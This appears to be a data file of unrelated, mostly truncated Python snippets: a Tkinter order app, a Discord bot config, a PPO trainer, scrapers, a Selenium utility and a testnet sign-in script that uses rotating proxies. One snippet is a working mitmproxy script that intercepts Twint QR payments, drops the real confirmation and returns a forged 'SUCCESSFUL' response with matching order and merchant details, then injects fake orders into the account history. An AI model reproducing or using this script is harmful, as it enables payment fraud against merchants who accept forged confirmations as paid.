padx=10, pady=5)\r\ntk.Entry(pedido_frame, textvariable=tipo_var).grid(row=0, column=1, padx=10, pady=5)\r\n\r\ntk.Label(pedido_frame, text=\"Sabor del Jugo:\").grid(row=1, column=0, padx=10, pady=5)\r\ntk.Entry(pedido_frame, textvariable=sabor_var).grid(row=1, column=1, padx=10, pady=5)\r\n\r\ntk.Label(pedido_frame, text=\"Precio:\").grid(row=2, column=0, padx=10, pady=5)\r\ntk.Entry(pedido_frame, textvariable=precio_var).grid(row=2, column=1, padx=10, pady=5)\r\n\r\ntk.Button(pedido_frame, text=\"Agregar Pedido\", command=agregar_pedido).grid(row=3, column=0, columnspan=2, pady=10)\r\n\r\nlista_pedidos_texto = tk.Text(pedido_frame, height=10, width=40)\r\nlista_pedidos_texto.grid(row=4, column=0, columnspan=2, padx=10, pady=10)\r\n\r\ntotal_label = tk.Label(pedido_frame, text=\"Total: $0.00\", font=(\"Helvetica\", 14))\r\ntotal_label.grid(row=5, column=0, columnspan=2, pady=10)\r\n\r\n# Tabla de precios\r\nmenu_frame = tk.Frame(ventana_principal_frame)\r\nmenu_frame.grid(row=0, column=1, padx=10, pady=5)\r\n\r\ntk.Label(menu_frame, text=\"Men\u00fa\", font=(\"Helvetica\", 14)).grid(row=0, column=0, columnspan=3)\r\ntk.Label(menu_frame, text=\"Producto\").grid(row=1, column=0)\r\ntk.Label(menu_frame, text=\"Tipo\").grid(row=1, column=1)\r\ntk.Label(menu_frame, text=\"Precio\").grid(row=1, column=2)\r\n\r\nproductos = [\r\n    {\"producto\": \"Empanada\", \"tipo\": \"Carne\", \"precio\": 1.50},\r\n    {\"producto\": \"Empanada\", \"tipo\": \"Pollo\", \"precio\": 1.50},\r\n    {\"producto\": \"Empanada\", \"tipo\": \"Queso\", \"precio\": 1.50},\r\n    {\"producto\": \"Jugo\", \"tipo\": \"Naranja\", \"precio\": 1.00},\r\n    {\"producto\": \"Jugo\", \"tipo\": \"Manzana\", \"precio\": 1.00},\r\n    {\"producto\": \"Jugo\", \"tipo\": \"Uva\", \"precio\": 1.00},\r\n]",
    "from __future__ import annotations\n\nimport asyncio\nimport functools\nimport logging\nimport math\nimport os\nimport random\nimport re\nfrom dataclasses import dataclass, field\nfrom datetime import datetime, timedelta, timezone\nfrom enum import Enum\nfrom logging.handlers import RotatingFileHandler\nfrom typing import Any, Dict, List, Optional, Tuple, Union\n\nimport aiofiles\nimport aioshutil\nimport interactions\nimport orjson\nfrom interactions.client.errors import NotFound\nfrom interactions.ext.paginators import Paginator\n\nBASE_DIR: str = os.path.abspath(os.path.dirname(__file__))\nLOG_FILE: str = os.path.join(BASE_DIR, \"econelo.log\")\nELO_FILE: str = os.path.join(BASE_DIR, \"econelo.json\")\n\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.DEBUG)\nformatter = logging.Formatter(\n    \"%(asctime)s | %(process)d:%(thread)d | %(levelname)-8s | %(name)s:%(funcName)s:%(lineno)d - %(message)s\",\n    \"%Y-%m-%d %H:%M:%S.%f %z\",\n)\nfile_handler = RotatingFileHandler(\n    LOG_FILE, maxBytes=1024 * 1024, backupCount=1, encoding=\"utf-8\"\n)\nfile_handler.setFormatter(formatter)\nlogger.addHandler(file_handler)\n\n\n# Model\n\n\ndef format_discord_timestamp(dt: datetime) -> str:\n    unix_ts = int(dt.timestamp())\n    return f\"<t:{unix_ts}:F> (<t:{unix_ts}:R>)\"\n\n\nclass EmbedColor(Enum):\n    OFF = 0x5D5A58\n    FATAL = 0xFF4343\n    ERROR = 0xE81123\n    WARN = 0xFFB900\n    INFO = 0x0078D7\n    DEBUG = 0x00B7C3\n    TRACE = 0x8E8CD8\n    ALL = 0x0063B1\n\n\n@dataclass\nclass Config:\n    admin_role_id: int = 1200100104682614884\n    reward_roles: tuple[int, ...] = field(\n        default_factory=lambda: (\n            1241802041576390687,\n            1243261836187664545,\n            1275980805273026571,\n            1292065942544711781,\n            1200052609487208488,\n            1206939229418946560,\n        )\n    )\n\n    log_channel_id: int = 1166627731916734504\n    log_forum_id: int = 1159097493875871784\n    log_post_id: int = 1325002509713936434\n    status_roles: tuple[int, ...] = field(\n        default_factory=lambda: (\n            1200043628899356702,\n            1282944839679344721,\n            1164761892015833129,\n        )\n    )\n    status_amounts: dict[int, dict[str, float]] = field(\n        default_factory=lambda: {\n            1200043628899356702: {\n                \"daily\": 15.0,\n            },\n            1282944839679344721: {\n                \"daily\": 10.0,\n            },\n            1164761892015833129: {\n                \"daily\": 5.0,\n            },\n        }\n    )\n    guild_id: int = 1150630510696075404\n\n    reward_amounts: dict[int, dict[str, float]] = field(\n        default_factory=lambda: {\n            1241802041576390687: {\n                \"daily\": 50.0,\n                \"weekly\": 500.0,\n                \"monthly\": 2500.0,\n                \"seasonal\": 8000.0,\n                \"yearly\": 35000.0,\n            },\n            1243261836187664545: {\n                \"daily\": 40.0,\n                \"weekly\": 400.0,\n                \"monthly\": 2000.0,\n                \"seasonal\": 6000.0,\n                \"yearly\": 28000.0,\n            },\n            1275980805273026571: {\n                \"daily\": 35.0,\n                \"weekly\": 350.0,\n                \"monthly\": 1500.0,\n                \"seasonal\": 5000.0,\n                \"yearly\": 22000.0,\n            },\n            1292065942544711781: {\n                \"daily\": 30.0,\n                \"weekly\": 300.0,\n                \"monthly\": 1200.0,\n                \"seasonal\": 4000.0,\n                \"yearly\": 18000.0,\n            },\n            1200052609487208488: {\n                \"daily\": 25.0,\n                \"weekly\": 250.0,\n                \"monthly\": 1000.0,\n                \"seasonal\": 3000.0,\n                \"yearly\": 15000.0,\n            },\n            1206939229418946560: {\n                \"daily\": 20.0,\n                \"weekly\": 200.0,\n                \"monthly\": 800.0,\n                \"seasonal\": 2500.0,\n                \"yearly\": 12000.0,\n            },\n        }\n    )\n\n    welcome_base_points: int = 5\n    newbie_tasks: dict[str, dict[str, int | str]] = field(\n        default_factory=lambda: {\n            \"read_guide\": {\"points\": 3, \"description\": \"Read server guide\"},\n            \"introduce\": {\"points\": 4, \"description\": \"Make self-introduction\"},\n            \"first_message\": {\"points\": 2, \"description\": \"Send first message\"},\n            \"add_reaction\": {\"points\": 1, \"description\": \"Add reaction to a message\"},\n            \"join_voice\": {\"points\": 3, \"description\": \"Join voice channel\"},\n            \"use_bot\": {\"points\": 2, \"description\": \"Use bot features\"},\n            \"join_event\": {\"points\": 5, \"description\": \"Participate in server event\"},\n            \"invite_friend\": {\"points\": 8, \"description\": \"Invite a new member\"},\n        }\n    )\n\n    daily_points: int = field(default_factory=lambda: random.randint(8, 12))\n\n    message_reward: dict[str, dict[str, Any]] = field(\n        default_factory=lambda: {\n            \"base\": {\"min\": 0, \"max\": 3},\n            \"daily_limit\": {\"base\": 40, \"variance\": 15, \"m",
    "# Copyright 2022 The HuggingFace Team. All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nimport inspect\nimport math\nimport os\nimport time\nimport typing\nimport warnings\nfrom contextlib import nullcontext\nfrom typing import Callable, List, Optional, Union\n\nimport datasets\nimport numpy as np\nimport torch\nimport torch.nn.functional as F\nfrom accelerate import Accelerator\nfrom accelerate.utils import ProjectConfiguration, gather_object, is_deepspeed_available\nfrom datasets import Dataset\nfrom huggingface_hub import whoami\nfrom packaging import version\nfrom torch.optim import Adam\nfrom transformers import (\n    DataCollatorForLanguageModeling,\n    PreTrainedTokenizer,\n    PreTrainedTokenizerBase,\n    PreTrainedTokenizerFast,\n)\n\nfrom ..core import (\n    WANDB_PADDING,\n    PPODecorators,\n    clip_by_value,\n    convert_to_scalar,\n    entropy_from_logits,\n    flatten_dict,\n    logprobs_from_logits,\n    masked_mean,\n    masked_var,\n    masked_whiten,\n    set_seed,\n    stack_dicts,\n    stats_to_np,\n)\nfrom ..import_utils import is_npu_available, is_torch_greater_2_0, is_xpu_available\nfrom ..models import SUPPORTED_ARCHITECTURES, PreTrainedModelWrapper, create_reference_model\nfrom . import AdaptiveKLController, BaseTrainer, FixedKLController, PPOConfig, RunningMoments\n\n\nif is_deepspeed_available():\n    import deepspeed\n\nMODEL_CARD_TEMPLATE = \"\"\"---\nlicense: apache-2.0\ntags:\n- trl\n- ppo\n- transformers\n- reinforcement-learning\n---\n\n# {model_name}\n\nThis is a [TRL language model](https://github.com/huggingface/trl) that has been fine-tuned with reinforcement learning to\n guide the model outputs according to a value, function, or human feedback. The model can be used for text generation.\n\n## Usage\n\nTo use this model for inference, first install the TRL library:\n\n```bash\npython -m pip install trl\n```\n\nYou can then generate text as follows:\n\n```python\nfrom transformers import pipeline\n\ngenerator = pipeline(\"text-generation\", model=\"{model_id}\")\noutputs = generator(\"Hello, my llama is cute\")\n```\n\nIf you want to use the model for training or to obtain the outputs from the value head, load the model as follows:\n\n```python\nfrom transformers import AutoTokenizer\nfrom trl import AutoModelForCausalLMWithValueHead\n\ntokenizer = AutoTokenizer.from_pretrained(\"{model_id}\")\nmodel = AutoModelForCausalLMWithValueHead.from_pretrained(\"{model_id}\")\n\ninputs = tokenizer(\"Hello, my llama is cute\", return_tensors=\"pt\")\noutputs = model(**inputs, labels=inputs[\"input_ids\"])\n```\n\"\"\"\n\n\nclass PPOTrainer(BaseTrainer):\n    \"\"\"\n    The PPOTrainer uses Proximal Policy Optimization to optimise language models.\n    Note, this trainer is heavily inspired by the original OpenAI learning to summarize work here:\n    https://github.com/openai/summarize-from-feedback\n\n    Attributes:\n        **config** (`PPOConfig`) -- Configuration object for PPOTrainer. Check the documentation of `PPOConfig` for more\n            details.\n        **model** (`PreTrainedModelWrapper`) -- Model to be optimized, Hugging Face transformer model with a value head.\n            Check the documentation of `PreTrainedModelWrapper` for more details.\n        **ref_model** (`PreTrainedModelWrapper`, *optional*) -- Reference model to be used for KL penalty, Hugging Face\n            transformer model with a casual language modelling head. Check the documentation of `PreTrainedModelWrapper`\n            for more details. If no reference model is provided, the trainer will create a reference model with the same\n             architecture as the model to be optimized with shared layers.\n        **tokenizer** (`PreTrainedTokenizerBase`) -- Tokenizer to be used for encoding the\n            data. Check the documentation of `transformers.PreTrainedTokenizer` and\n            `transformers.PreTrainedTokenizerFast` for more details.\n        **dataset** (Union[`torch.utils.data.Dataset`, `datasets.Dataset`], *optional*) -- PyTorch dataset or Hugging\n            Face dataset. This is used to create a PyTorch dataloader. If no dataset is provided, the dataloader must be\n             created outside the trainer users needs to design their own dataloader and make sure the batch\n            size that is used is the same as the one specified in the configuration object.\n        **optimizer** (`torch.optim.Optimizer`, *optional*) -- Optimizer to be used for training. If no optimizer is\n            provided, the trainer will create an Adam optimizer with the learning rate specified in the configuration\n      ",
    "# core/calculations/quantum/quantum_melody_simulator.py\n# This Python file, quantum_melody_simulator.py, hosts the QuantumMelodySimulator\n# class that integrates quantum computing frameworks to simulate and analyze the\n# harmonic properties of quantum systems modeled after musical melodies. The class\n# leverages the Qiskit Aer library to perform detailed quantum simulations based on given\n# frequencies and amplitudes, and incorporates an analysis of the resulting quantum states\n# using harmonic and quantum mechanical metrics. The simulator is designed to provide\n# insights into the quantum behaviors of musical structures, making it particularly useful\n# for research in quantum acoustics, where music theory intersects with quantum physics.\n\n\nfrom qiskit_aer import AerSimulator\nimport numpy as np\nfrom core.calculations.quantum.quantum_circuit_builder import create_circuit\nfrom core.calculations.quantum.quantum_harmonic_analysis import QuantumHarmonicsAnalyzer\n\n\nclass QuantumMelodySimulator:\n    def __init__(self):\n        self.simulator = AerSimulator()\n        self.analyzer = QuantumHarmonicsAnalyzer()\n\n    def simulate_melody(self, frequencies, amplitudes):\n        \"\"\"\n        Simulate quantum melody using existing infrastructure\n        \"\"\"\n        try:\n            # Create circuit\n            circuit = create_circuit(frequencies, amplitudes)\n\n            # Run circuit simulation\n            job = self.simulator.run(circuit, shots=1024)\n            counts = job.result().get_counts()\n\n            # Run harmonic analysis\n            harmonic_results = self.analyzer.analyze_harmonics(\n                frequencies=frequencies, amplitudes=amplitudes\n            )\n\n            # Get statevector and set defaults if not present\n            statevector = harmonic_results.get(\n                \"statevector\", np.zeros(len(frequencies), dtype=complex)\n            )\n\n            # Calculate phases\n            phases = np.angle(statevector)\n\n            # Get purity and fidelity with defaults\n            purity = harmonic_results.get(\"purity\", 0.0)\n            fidelity = harmonic_results.get(\"fidelity\", 0.0)\n\n            # Format results for particle simulation\n            simulation_data = {\n                \"circuit\": circuit,\n                \"counts\": counts,\n                \"statevector\": statevector,\n                \"phases\": phases,\n                \"frequencies\": frequencies,\n                \"amplitudes\": amplitudes,\n                \"pythagorean_analysis\": harmonic_results.get(\n                    \"pythagorean_analysis\", []\n                ),\n                \"atomic_analysis\": harmonic_results.get(\"atomic_analysis\", []),\n                \"quantum_metrics\": {\"purity\": purity, \"fidelity\": fidelity},\n            }\n\n            return simulation_data\n\n        except Exception as e:\n            print(f\"Error in quantum melody simulation: {str(e)}\")\n            raise\n\n    def analyze_interference(self, statevector):\n        \"\"\"\n        Analyze quantum interference patterns\n        \"\"\"\n        interference = np.abs(np.fft.fft(statevector)) ** 2\n        entropy = -np.sum(\n            np.abs(statevector) ** 2 * np.log2(np.abs(statevector) ** 2 + 1e-10)\n        )\n\n        return {\"interference_pattern\": interference, \"entanglement_entropy\": entropy}\n",
    "import re\nimport pandas as pd\n\ndef preprocess(data):\n    pattern = r'\\d{1,2}/\\d{1,2}/\\d{2,4},\\s\\d{1,2}:\\d{2}\\s-\\s'\n\n    messages = re.split(pattern, data)[1:]\n    dates = re.findall(pattern, data)\n\n    df = pd.DataFrame({'user_message': messages, 'message_date': dates})\n    # convert message_date type\n    df['message_date'] = pd.to_datetime(df['message_date'], format='%d/%m/%Y, %H:%M - ')\n\n    df.rename(columns={'message_date': 'date'}, inplace=True)\n\n    users = []\n    messages = []\n    for message in df['user_message']:\n        entry = re.split('([\\w\\W]+?):\\s', message)\n        if entry[1:]:  # user name\n            users.append(entry[1])\n            messages.append(\" \".join(entry[2:]))\n        else:\n            users.append('group_notification')\n            messages.append(entry[0])\n\n    df['user'] = users\n    df['message'] = messages\n    df.drop(columns=['user_message'], inplace=True)\n\n    df['only_date'] = df['date'].dt.date\n    df['year'] = df['date'].dt.year\n    df['month_num'] = df['date'].dt.month\n    df['month'] = df['date'].dt.month_name()\n    df['day'] = df['date'].dt.day\n    df['day_name'] = df['date'].dt.day_name()\n    df['hour'] = df['date'].dt.hour\n    df['minute'] = df['date'].dt.minute\n\n    period = []\n    for hour in df[['day_name', 'hour']]['hour']:\n        if hour == 23:\n            period.append(str(hour) + \"-\" + str('00'))\n        elif hour == 0:\n            period.append(str('00') + \"-\" + str(hour + 1))\n        else:\n            period.append(str(hour) + \"-\" + str(hour + 1))\n\n    df['period'] = period\n\n    return df",
    "from provider import BaseProvider\nfrom utils import save_cookies, load_cookies, download_images_and_videos\nfrom playwright.sync_api import sync_playwright,Page\nimport time \n\nurl_entry_jd = \"https://www.jd.com\"\nurl_dst_jd = \"https://re.jd.com/search?keyword=jd.com%e4%ba%ac%e4%b8%9c&ev=5_244342&keywordid=172887082225&re_dcp=202m0QjIIg==&traffic_source=1004&enc=utf8&cu=true&utm_source=baidu-search&utm_medium=cpc&utm_campaign=t_262767352_baidusearch&utm_term=172887082225_0_deed4eca0a4b46dfad2a71647bc4c09a\"\n\n\n\nclass jd(BaseProvider):\n    def login(self):\n        page = self.context.new_page()\n        page.goto(\"https://www.jd.com\")\n        if not self._is_logged_in(page):\n            if not self._wait_for_manual_login(page):\n                print(\"\u672a\u80fd\u5b8c\u6210\u767b\u5f55\uff0c\u9000\u51fa\u811a\u672c\")\n                self.browser.close()\n                return\n\n        print(\"jd login\")\n\n\n    def download(self):\n        page = self.context.new_page()\n        page.goto(url_dst_jd)\n        download_images_and_videos(page)\n        print(\"jd download\")\n\n\n    def _is_logged_in(self,page):\n        \"\"\"\u5224\u65ad\u662f\u5426\u5df2\u767b\u5f55\u4eac\u4e1c\uff0c\u901a\u8fc7\u68c0\u67e5\u9875\u9762\u4e0a\u662f\u5426\u5b58\u5728\u4e2a\u4eba\u8d26\u6237\u76f8\u5173\u5143\u7d20\"\"\"\n        try:\n            # \u4f7f\u7528\u4eac\u4e1c\u767b\u5f55\u540e\u5e38\u89c1\u7684\u5143\u7d20\u5224\u65ad\uff0c\u4f8b\u5982\u7528\u6237\u5934\u50cf\u6216\u8d26\u6237\u540d\u79f0\n            page.wait_for_load_state(\"load\")  # \u786e\u4fdd\u9875\u9762\u52a0\u8f7d\u5b8c\u6210\n            return page.query_selector(\".nickname\") is not None\n        except Exception as e:\n            print(f\"\u68c0\u67e5\u767b\u5f55\u72b6\u6001\u65f6\u51fa\u9519: {e}\")\n            return False\n\n    def _wait_for_manual_login(self,page:Page, timeout=300):\n        \"\"\"\u7b49\u5f85\u7528\u6237\u624b\u52a8\u767b\u5f55\uff0c\u8d85\u65f6\u65f6\u95f4\u4e3a300\u79d2\"\"\"\n        print(\"\u8bf7\u624b\u52a8\u5b8c\u6210\u767b\u5f55...\")\n        page.goto(url_entry_jd)\n        start_time = time.time()\n        while time.time() - start_time < timeout:\n            try:\n                page.wait_for_load_state(\"load\")  # \u7b49\u5f85\u9875\u9762\u52a0\u8f7d\u5b8c\u6210\n                if self._is_logged_in(page):\n                    print(\"\u767b\u5f55\u6210\u529f!\")\n                    save_cookies(page.context,self.cookie_config_path)\n                    return True\n            except Exception as e:\n                print(f\"\u7b49\u5f85\u767b\u5f55\u8fc7\u7a0b\u4e2d\u51fa\u9519: {e}\")\n            time.sleep(2)\n        print(\"\u624b\u52a8\u767b\u5f55\u8d85\u65f6\")\n        return False\n    \n\n\n",
    "import logging\nfrom selenium.webdriver.common.by import By\nfrom utilities.wait_utility import WaitUtility\nfrom utilities.logger import get_logger\n\nlogger = get_logger()\n\nclass TypeUtility:\n    \"\"\"\n    Utility class to handle typing actions in Selenium.\n    \"\"\"\n\n    def __init__(self, driver):\n        \"\"\"\n        Initialize the TypeUtility with a WebDriver instance.\n\n        :param driver: Selenium WebDriver instance\n        \"\"\"\n        self.driver = driver\n        self.wait_utility = WaitUtility(driver)\n\n    def type_text(self, locator_type, locator, text):\n        \"\"\"\n        Wait for an element to be visible and type text into it.\n\n        :param locator_type: Type of locator (e.g., By.ID, By.XPATH)\n        :param locator: Locator value\n        :param text: Text to be typed into the element\n        \"\"\"\n        try:\n            logger.info(f\"Waiting for element with locator: {locator} to be visible.\")\n            element = self.wait_utility.wait_for_element_visible(locator_type, locator)\n            logger.info(f\"Element found: {locator}. Clearing existing text and typing new text.\")\n            element.clear()  # Clear existing text if any\n            element.send_keys(text)\n            logger.info(f\"Text '{text}' typed into element: {locator}\")\n        except Exception as e:\n            logger.error(f\"An error occurred while typing text into element {locator}: {str(e)}\")\n            raise\n\n    def append_text(self, locator_type, locator, text):\n        \"\"\"\n        Wait for an element to be visible and append text into it.\n\n        :param locator_type: Type of locator (e.g., By.ID, By.XPATH)\n        :param locator: Locator value\n        :param text: Text to append to the existing value in the element\n        \"\"\"\n        try:\n            logger.info(f\"Waiting for element with locator: {locator} to be visible.\")\n            element = self.wait_utility.wait_for_element_visible(locator_type, locator)\n            logger.info(f\"Element found: {locator}. Appending text.\")\n            element.send_keys(text)\n            logger.info(f\"Text '{text}' appended to element: {locator}\")\n        except Exception as e:\n            logger.error(f\"An error occurred while appending text to element {locator}: {str(e)}\")\n            raise\n",
    "\"\"\"\nFake the payment confirmation after scanning a Twint QR code\n\n$ mitmdump -p 9090 -s payment_interceptor.py\n\"\"\"\n\nfrom mitmproxy import http\nfrom mitmproxy import ctx\nimport json\nimport datetime\nimport uuid\n\n# qr payment merchant meta information\nglobal_merchantUUID = ''\nglobal_merchantLogoUUID = ''\nglobal_merchantName = ''\nglobal_branchName = ''\nglobal_financialAccountId = ''\n\n# global orders history\nglobal_fake_orders = []\n\n# templates\nresponse_template = '{\"paymentConfirmation\":{\"uuid\":\"9fc4e990-656e-479d-a416-23ef7167f5ef\",\"remainingAmount\":0.00,\"remainingAmountCurrency\":\"CHF\",\"confirmedAmount\":0.05,\"confirmedAmountCurrency\":\"CHF\",\"isPartial\":false},\"paymentDetails\":{\"startingOrigin\":\"SMALL_BUSINESS_SOLUTION\",\"couponsToBeRedeemed\":[],\"couponsPossible\":true,\"pairingUuid\":\"005d7374-02ef-4a85-9588-c66e70538150\",\"orderUuid\":\"9fc4e990-656e-479d-a416-23ef7167f5ef\",\"status\":\"SUCCESSFUL\",\"amount\":0.05,\"currency\":\"CHF\",\"availableAmount\":0.05,\"availableAmountCurrency\":\"CHF\",\"paymentPossible\":\"FULL\",\"pinlessPaymentAllowed\":false,\"confirmationNeeded\":true,\"token\":\"30117\",\"merchantUuid\":\"33e360a3-65c3-4205-9d2d-553d249ea1fe\",\"merchantName\":\"Jans Shop\",\"merchantLogoUuid\":\"dd09bd93-9da6-4f20-890e-34b15ace443a\",\"orderType\":\"PAYMENT\",\"merchantConfirmation\":false,\"terminalExtId\":\"096514f9-5094-4fa3-b462-f288dbc30a2b\",\"branchName\":\"Test Shop, Zuerich\",\"shouldRedirectToReceiptUrl\":false,\"paymentAuthorizationType\":\"FINAL_AUTH\"}}'\n\ndef response(flow: http.HTTPFlow) -> None:\n    # preserve the merchant metdata which is later shown in the confirmation view\n    if \"smartphone/service/v28/qrCodes\" in flow.request.pretty_url: \n        if flow.response.content:\n            try:\n                response_data = json.loads(flow.response.content)\n                global global_merchantUUID\n                global_merchantUUID = response_data['initiatePayment']['merchantUuid']\n\n                global global_merchantLogoUUID\n                global_merchantLogoUUID = response_data['initiatePayment']['merchantLogoUuid']\n                \n                global global_merchantName\n                global_merchantName = response_data['initiatePayment']['merchantName']\n\n                global global_branchName\n                global_branchName = response_data['initiatePayment']['branchName']\n\n                ctx.log.info(\"Updated merchant information: \" + global_merchantName)\n            except Exception as e:\n                ctx.log.error(\"Failed updating merchant information:\" + str(e))\n\n    # intercept the orders and merge them with the global orders to fake the account orders history\n    if  \"/smartphone/service/v28/orders?since\" in flow.request.pretty_url:\n        if flow.response.content:\n            try:\n                response_data = json.loads(flow.response.content)\n                merged_oders = global_fake_orders + response_data['entries']\n                sorted_orders =  sorted(merged_oders, key=lambda order: datetime.datetime.strptime(order['ctlModTs'], \"%Y-%m-%dT%H:%M:%S.%f%z\"), reverse=True)\n                response_data['entries'] = sorted_orders\n                flow.response.content = json.dumps(response_data, ensure_ascii=False).encode()\n                ctx.log.info(\"Updated orders history\")\n            except Exception as e:\n                ctx.log.error(\"Failed updating orders history \" + str(e))\n\ndef request(flow: http.HTTPFlow) -> None:\n    # intercept the QR shop payment confirmation, drop the original request and return a faked response\n    if \"/payments/confirmation\" in flow.request.pretty_url:\n        if flow.request.content:\n            try:\n                request_data = json.loads(flow.request.content)\n                original_amount = request_data['amount']['amount']\n                \n                # set financial account id for fake order history\n                global global_financialAccountId\n                global_financialAccountId  = request_data['financialAccountId']\n\n                orderUuid = request_data['orderUuid']\n                response_data = json.loads(response_template)\n                # update order uuid to prevent in app check which fails the transaction if not matching\n                response_data['paymentConfirmation']['uuid'] = orderUuid\n                response_data['paymentDetails']['orderUuid'] = orderUuid\n                # copy correct amount\n                response_data['paymentConfirmation']['confirmedAmount'] = original_amount\n                response_data['paymentDetails']['amount'] = original_amount\n                response_data['paymentDetails']['availableAmount'] = original_amount\n                # set correct merchant info\n                response_data['paymentDetails']['merchantUuid'] = global_merchantUUID\n                response_data['paymentDetails']['merchantLogoUuid'] = global_merchantLogoUUID\n                response_data['paymentDetails']['merchantName'] = global_merchantName\n                response_data['paymentDetails']['branchName'] = global_branchName\n          ",
    "import requests\nimport json\nimport random\n\ndef get_proxy():\n    try:\n        with open('proxylist.txt', 'r') as file:\n            proxies = [line.strip() for line in file if line.strip()]\n        if proxies:\n            return random.choice(proxies)\n        else:\n            print(\"\u274c Proxy list is empty!\")\n            return None\n    except FileNotFoundError:\n        print(\"\u274c proxylist.txt not found!\")\n        return None\n\ndef auto_sign_in(token):\n    url = 'https://task-api.testnet.mangonetwork.io/base/doSign'\n    headers = {\n        'Accept': '*/*',\n        'Accept-Encoding': 'gzip, deflate, br, zstd',\n        'Accept-Language': 'en',\n        'Cache-Control': 'max-age=0',\n        'Content-Type': 'application/json;charset=utf-8',\n        'mgo-token': token,\n        'Origin': 'https://task.testnet.mangonetwork.io',\n        'Referer': 'https://task.testnet.mangonetwork.io/',\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',\n        'Sec-Fetch-Dest': 'empty',\n        'Sec-Fetch-Mode': 'cors',\n        'Sec-Fetch-Site': 'same-site',\n        'sec-ch-ua': '\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"',\n        'sec-ch-ua-mobile': '?0',\n        'sec-ch-ua-platform': '\"Windows\"'\n    }\n    payload = {}\n\n    proxy = get_proxy()\n    proxies = {\n        'http': proxy,\n        'https': proxy\n    } if proxy else None\n\n    try:\n        response = requests.post(url, headers=headers, data=json.dumps(payload), proxies=proxies)\n        if response.status_code == 200:\n            data = response.json()\n            if data.get('code') == 0:\n                print(\"\u2705 Sign-in successful!\")\n            else:\n                print(f\"\u274c Sign-in failed: {data.get('msg')}\")\n        else:\n            print(f\"\u274c Failed to sign in. Status Code: {response.status_code}\")\n            print(response.text)\n    except requests.exceptions.RequestException as e:\n        print(f\"\u274c Sign-in request failed: {e}\")\n\nif __name__ == '__main__':\n    token = input(\"Enter your mgo-token for sign-in: \").strip()\n    if token:\n        auto_sign_in(token)\n    else:\n        print(\"\u274c Token cannot be empty!\")\n",
    "from bs4 import BeautifulSoup\nimport random\nimport requests\nimport re,json\nfrom playwright.sync_api import sync_playwright\nurl = \"https://www.ricardo.ch/\"\ndef remove_duplicates(word_list):\n    unique_words = list(set(word_list))\n    return unique_words\n\n\ndef product(url: str):\n    with sync_playwright() as p:\n        # Launch browser in headless mode\n        browser = p.chromium.launch(headless=True, channel=\"chrome\")\n        context = browser.new_context(\n            user_agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0\"\n        )\n        fo = None\n        co = None\n        all_images = []\n        finished = False\n        page = context.new_page()\n        page.goto(url)\n        page.wait_for_selector('img')\n        page.wait_for_load_state(\"load\")\n        soup = BeautifulSoup(page.content(), 'html.parser', from_encoding='utf-8')  # Ensure BeautifulSoup uses UTF-8\n\n        while not finished:\n            img_src = page.locator('img').first.get_attribute('src')\n            page.wait_for_timeout(100)\n            co = img_src\n            all_images.append(img_src)\n\n            if fo is None:\n                fo = img_src\n            else:\n                if co == fo:\n                    finished = True\n                    break\n            page.wait_for_timeout(100)\n            try:\n                page.click('button.MuiButtonBase-root.MuiIconButton-root.MuiIconButton-sizeLarge.mui-1iqj9qi', timeout=100)\n            except:\n                break\n\n        type = None\n        pricing = []\n        instant_buy = False\n        bid_button = soup.find(\"button\", {\"id\": \"btnPlaceBidCTA\"})\n        price1 = soup.find(\"div\", class_=\"MuiBox-root mui-xf2v4p\")\n        price2 = soup.find(\"p\", class_=\"MuiBox-root mui-xf2v4p\")\n\n        if bid_button:\n            type = \"auction\"\n            if price1:\n                pricing.append({\"starting_price\": float(price2.text.replace(\"'\", \"\")), \"buy_now_price\": float(price1.text.replace(\"'\", \"\"))})\n                instant_buy = True\n            else:\n                pricing.append({\"starting_price\": float(price2.text.replace(\"'\", \"\"))})\n                instant_buy = False\n        else:\n            type = \"sale\"\n            pricing.append({\"buy_now_price\": float(price2.text.replace(\"'\", \"\"))})\n        \n        title = soup.find(\"h1\", class_=\"MuiBox-root mui-1mg8wvf\").text\n        descriptions = soup.find(\"div\", class_=\"MuiBox-root mui-wvzkyj\").find(\"article\").find_all(\"p\")\n        description = [desc.text for desc in descriptions]\n\n        product_aop = soup.find(\"div\", class_=\"MuiBox-root mui-5k7eiq\").get_text()\n        \n        browser.close()\n\n        return {\n            \"type\": type,\n            \"images\": all_images,\n            \"title\": title,\n            \"uncut_url\": url,\n            \"cut_url\": url,\n            \"pricing\": pricing[0],\n            \"description\": description,\n            \"instant_buy\": instant_buy,\n            \"product_aop\": {\n                \"text\": product_aop,\n            }\n        }\n\n\n\n\ndef AmountOfOfferPages(name: str) -> list:\n    global url\n    pages = []\n    page = 1\n    while True:\n        response = requests.get(url=url+f\"de/shop/{name}/offers/?page={page}\")\n        if response.status_code != 200:\n            break\n        pages.append(page)\n        page += 1\n    return pages\n\ndef ShopOffers(name:str, page:int=1, exclude_owi:bool=False, links_only:bool=False):\n    global url\n    v_results = []\n\n    if page < 1:\n        raise ValueError(\"page parameter has to be 1 or over\")\n    \n    html = requests.get(url=url+F\"de/shop/{name}/offers/?page={str(page)}\")\n    if html.status_code == 404:\n        return [\"None found\"]\n    s = BeautifulSoup(html.content, 'html.parser')\n    results = s.find_all('a', class_=\"style_link__ewXtk\")\n    if links_only:\n        for result in results:\n            v_results.append(result.get('href'))\n    else:\n        for result in results:\n            text_elements = result.stripped_strings\n            img_tag = result.find('img', class_=\"MuiBox-root mui-htynqc\")\n            img = img_tag.get(\"src\") if img_tag else None  # Handle None case\n            if exclude_owi and img is None:\n                continue\n            separated_texts = \"|\".join(text_elements).split(\"|\")\n            try:\n                    if len(separated_texts) == 3:\n                        v_results.append({  \"shop\": name,\n                                            \"image\": img,\n                                            \"title\": 